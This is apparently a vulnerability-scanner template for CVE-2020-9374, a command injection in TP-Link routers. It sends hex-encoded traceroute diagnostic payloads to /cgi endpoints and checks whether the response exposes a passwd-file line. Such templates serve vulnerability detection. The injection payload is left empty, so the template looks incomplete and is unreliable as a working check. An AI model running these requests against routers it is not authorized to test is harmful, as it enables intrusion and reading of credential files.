id: cve-2020-9374
info:
  name: Command Execution in Multiple TP-LINK Routers
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Multiple models of TP-Link routers are vulnerable to a command execution flaw. Attackers can exploit this vulnerability to execute arbitrary commands, inject backdoors, gain server privileges, and take control of the entire web server.
  reference:
    - https://www.exploit-db.com/exploits/48155
  classification:
    cve-id: CVE-2020-9374
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8

variables:
  encoded_payload_1: "{{hex_decode('')}}"
  encoded_payload_2: "{{hex_decode('5b4143545f4f505f5452414345525423302c302c302c302c302c3023302c302c302c302c302c305d302c300d0a0d0a')}}"
  encoded_payload_3: "{{hex_decode('5b5452414345524f5554455f4449414723302c302c302c302c302c3023302c302c302c302c302c305d302c330d0a646961676e6f737469637353746174650d0a585f54505f486f705365710d0a585f54505f526573756c740d0a0d0a')}}"

http:
  - id: initial-check
    method: POST
    path:
      - "{{BaseURL}}/cgi?2"
    headers:
      Cookie: "Authorization=Basic REPLACEBASE64AUTH"
      Referer: "http://{{Hostname}}/mainFrame.htm"
    body: "{{encoded_payload_1}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "error"

  - id: secondary-check
    method: POST
    path:
      - "{{BaseURL}}/cgi?7"
    headers:
      Cookie: "Authorization=Basic REPLACEBASE64AUTH"
      Referer: "http://{{Hostname}}/mainFrame.htm"
    body: "{{encoded_payload_2}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "error"

  - id: final-check
    method: POST
    path:
      - "{{BaseURL}}/cgi?1"
    headers:
      Cookie: "Authorization=Basic REPLACEBASE64AUTH"
      Referer: "http://{{Hostname}}/mainFrame.htm"
    body: "{{encoded_payload_3}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "X_TP_Result=admin:(.*?):/bin/\\w*sh"
